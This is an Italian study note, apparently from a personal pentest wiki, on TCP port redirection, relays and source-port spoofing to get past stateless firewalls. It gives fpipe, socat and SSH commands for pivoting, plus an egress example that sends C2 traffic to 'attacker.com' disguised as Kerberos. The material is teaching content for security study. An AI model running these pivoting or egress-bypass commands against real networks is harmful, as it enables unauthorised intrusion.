# Port Redirection e Relay TCP

## Cos'è e perché serve

La **port redirection** (o port forwarding) è la tecnica con cui un host intermedio accetta traffico su una porta e lo gira verso un'altra destinazione (diversa porta, diverso IP, o entrambi).

Scenario tipico in un pentest:

```
Internet                  Firewall                  Rete interna
                       ┌──────────────┐
attacker               │ BLOCK :21    │         host compromesso
                       │ ALLOW :80    │         (ha un FTP su :21)
                       └──────────────┘
```

Il firewall blocca la porta 21. Ma l'attaccante ha già compromesso un host dentro la rete. Quel host può:

1. Mettersi in ascolto su una porta permessa (es. :80)
2. Forwardare il traffico ricevuto verso la porta bloccata (:21) localmente o su un altro host interno

L'attaccante si connette a :80 e parla FTP, come se stesse parlando direttamente a :21.

> [!note] Dove si colloca nella kill chain Port redirection è una tecnica di **pivoting**: una volta dentro un host, lo usi come ponte per raggiungere segmenti di rete altrimenti inaccessibili dall'esterno. Compare nel capitolo di HE7 dedicato alla evasione dei firewall e alla lateral movement.

---

## Il modello fondamentale: due connessioni TCP separate

Questo è il punto critico da capire. Un port relay **non è un tunnel trasparente** — è un processo che **termina entrambe le connessioni TCP** e copia i byte tra i due socket.

Ogni connessione TCP ha 4 valori:

```
src_ip : src_port  →  dst_ip : dst_port
```

Con fpipe in mezzo ci sono **due connessioni indipendenti**, ognuna con i propri 4 valori:

```
ATTACKER                    HOST COMPROMESSO (fpipe)             TARGET
                           ┌──────────────────────┐
                           │  SOCKET A            │
1.2.3.4:50000  ──────────► │  dst: 10.0.0.5:80    │
                           │                      │
                           │  RELAY (copia byte)  │
                           │                      │
                           │  SOCKET B            │
                           │  src: 10.0.0.5:88   │ ──────────► 10.0.0.6:21
                           └──────────────────────┘

Connessione 1:  1.2.3.4:50000    → 10.0.0.5:80   (attacker verso fpipe)
Connessione 2:  10.0.0.5:88      → 10.0.0.6:21   (fpipe verso target)
```

Queste due connessioni **non si toccano a livello TCP**. Il relay avviene nell'applicazione.

---

## Come funziona il relay internamente

fpipe (come qualsiasi relay TCP) fa tre cose:

1. **Bind + listen** sulla porta locale (80) → aspetta connessioni in ingresso
2. **Bind + connect** verso la destinazione (88 → 10.0.0.6:21) → apre la connessione uscente
3. **Loop di copia byte** bidirezionale tra i due socket

In pseudocodice:

```python
# Passo 1: setup ascolto
listen_sock.bind(port=80)
listen_sock.listen()
client_sock = listen_sock.accept()   # attacker si connette

# Passo 2: apri connessione verso target
target_sock.bind(source_port=88)     # <-- forza source port
target_sock.connect(target_ip, port=21)

# Passo 3: relay bidirezionale (due thread in parallelo)
thread A:
    while True:
        data = client_sock.recv(4096)  # leggi da attacker
        target_sock.send(data)         # scrivi verso target

thread B:
    while True:
        data = target_sock.recv(4096)  # leggi da target
        client_sock.send(data)         # scrivi verso attacker
```

Il "redirect" è letteralmente `recv()` → `send()` sull'altro socket. Niente di speciale.

> [!tip] Conseguenza del relay applicativo Poiché le connessioni terminano entrambe dentro fpipe (Layer 7):
> 
> - I numeri di sequenza TCP sono **indipendenti** tra le due connessioni
> - Il target vede come sorgente l'**IP dell'host compromesso**, mai l'IP dell'attaccante
> - fpipe può fare buffering se le due connessioni hanno velocità diverse

> [!analogy] Linux parallel È esattamente quello che fa `socat`, o due `nc` con una pipe tra loro, o 10 righe di Python con il modulo `socket`. fpipe è questo, compilato per Windows.

---

## Source port spoofing: cos'è e quando serve

### Il meccanismo

Normalmente quando un processo apre una connessione TCP outbound, il kernel assegna una **ephemeral port** casuale come source port (range tipico: 32768–60999 su Linux, 49152–65535 su Windows).

fpipe permette di forzare la source port con `-s <porta>`. Prima di `connect()`, chiama `bind()` specificando la porta voluta. Il kernel onora la richiesta: il SYN uscente avrà quella source port.

### Perché bypasserebbe un firewall

Alcuni firewall (spesso vecchi, o mal configurati) hanno regole basate sulla **source port** invece che sullo stato della connessione:

```
# Regola mal scritta (intento: permetti risposte Kerberos in uscita)
ALLOW tcp 10.0.0.0/24:88 → ANY:*
```

L'admin voleva "permettere al Kerberos server di rispondere ai client". Ma la regola è stateless e permette qualunque pacchetto con source port 88 — anche SYN nuovi, non solo ACK di risposta.

Forzando `-s 88`, fpipe genera traffico con source port 88. Il firewall lo classifica come "risposta Kerberos" e lo lascia passare.

### Tabella porte spesso usate per questo trick

|Porta|Protocollo|Perché è "fidata"|
|---|---|---|
|53|DNS|Quasi sempre permessa sia in entrata che in uscita|
|88|Kerberos|Permessa nelle reti Windows enterprise|
|80 / 443|HTTP / HTTPS|Raramente bloccate in uscita|
|123|NTP|Spesso ignorata dai firewall|

> [!warning] Limitazione importante Firewall **stateful** moderni (iptables con conntrack, pf, Palo Alto, Fortinet...) tracciano lo stato di ogni connessione e distinguono un SYN (nuova connessione) da un ACK (risposta a connessione esistente). Il source port trick funziona **solo contro firewall stateless o con regole mal scritte**. Su qualsiasi setup decente post-2005 questo non funziona.
> 
> Rimane un esempio didattico fondamentale perché illustra perfettamente la differenza tra **port-based filtering** e **stateful inspection**.

---

## fpipe: il tool di HE7

> [!warning] Tool obsoleto fpipe è stato sviluppato da **Foundstone** (acquisita da McAfee nel 2004) e non è stato aggiornato. Sui sistemi Windows moderni può non funzionare e viene rilevato dagli AV. Il libro lo usa come esempio didattico — il concetto è valido, il tool no.

### Sintassi essenziale

```
fpipe.exe -l <listen_port> -r <remote_port> [-s <source_port>] <target_ip>
```

|Flag|Significato|
|---|---|
|`-l 80`|Ascolta su porta locale 80 (listen port)|
|`-r 21`|Connetti verso target:21 (destination port)|
|`-s 88`|Forza source port 88 sulla connessione uscente|
|`10.0.0.6`|IP del target (destinazione del forwarding)|

**Esempio completo:**

```
fpipe.exe -l 80 -r 21 -s 88 10.0.0.6
```

Leggi: "ascolta su :80, forwarda a 10.0.0.6:21, usa source port 88 per la connessione uscente"

---

## Tool moderni equivalenti

### socat (Linux — il più flessibile)

```bash
# Equivalente di fpipe senza source port
socat TCP-LISTEN:80,fork TCP:10.0.0.6:21

# Con source port specificata
socat TCP-LISTEN:80,fork TCP:10.0.0.6:21,sourceport=88,reuseaddr
```

> [!analogy] Linux parallel socat : fpipe = Swiss army knife : coltellino tascabile. socat gestisce TCP, UDP, Unix socket, file, pipe, TLS — fpipe fa solo TCP relay su Windows.

### Altri tool in contesto pentest moderno

|Tool|Note|
|---|---|
|`socat`|Standard su Linux, massima flessibilità|
|`ncat` (nmap)|Multipiattaforma, semplice, ha `--sh-exec` per relay|
|`ssh -L / -R / -D`|Il gold standard quando hai accesso SSH: stabile, cifrato, autentica|
|`chisel`|TCP/UDP tunnel over HTTP, ideale quando solo :80/:443 escono|
|`ligolo-ng`|Standard moderno nei red team: crea VPN-like sull'infrastruttura compromessa|
|`rinetd`|Daemon Linux per port forwarding statico, config-based|

### Confronto ssh tunneling vs relay applicativo

```bash
# ssh -L: tunnel locale → porta remota tramite SSH
ssh -L 8021:ftp-server:21 user@jump-host
# Ora localhost:8021 raggiunge ftp-server:21 attraverso jump-host

# Equivalente fpipe: fpipe gira sul jump-host
# ssh -L gira sul client dell'attaccante
```

La differenza: con fpipe devi avere già esecuzione arbitraria sull'host compromesso. Con SSH bastano credenziali SSH valide.

---

## Scenari di utilizzo reali

### Scenario 1 — Bypass inbound firewall (classico HE7)

```
[Attacker] ──:80──► [Firewall: ALLOW 80, BLOCK 21] ──► [Victim con FTP su :21]
                                                          └── fpipe: :80 → :21
```

fpipe gira sulla vittima, ascolta su :80, forwarda locale a :21.

### Scenario 2 — Pivot verso rete interna (più realistico oggi)

```
Internet      DMZ                    Rete interna
              (host compromesso)
[Attacker] ──► [fpipe] ─────────────► [Internal server :3389]
               :80 → 10.0.1.5:3389
```

Dall'esterno vedo solo il DMZ host su :80, ma sto parlando con RDP dell'internal server.

### Scenario 3 — Egress bypass con source port (classico fpipe trick)

```
[Internal host] ──:88──► [Firewall: ALLOW src:88 outbound] ──► [Attacker C2 :21]
 fpipe -l 1337 -r 21 -s 88 attacker.com
```

Il traffico C2 sembra traffico Kerberos in uscita.

---

## Takeaways

1. **Port redirection = relay applicativo**, non tunnel kernel. Due TCP connections indipendenti con copia byte in mezzo.
    
2. **Source port e listen port sono concetti ortogonali**: la listen port è la destination port della connessione _in ingresso_, la source port è la source port della connessione _in uscita_. Appartengono a due socket diversi.
    
3. **Source port spoofing bypassa solo firewall stateless**. Contro stateful inspection non serve a nulla.
    
4. **fpipe è morto**, ma socat/chisel/ligolo-ng coprono tutti i suoi casi d'uso e molto di più.
    
5. **Il pattern concettuale è eterno**: qualsiasi volta che vuoi "far passare traffico attraverso un buco nel firewall", stai facendo port redirection. I tool cambiano, la logica no.
    

---

## Wiki-links

- [[lab_active_directory_fedora]] — lab dove questi concetti di pivoting saranno usati
- [[windows_domain_logon]] — Kerberos (porta 88 usata come esempio nel source port trick)
- [[lab_session_3_lsass_dump_windows11_defenses]] — sessione precedente, contesto lateral movement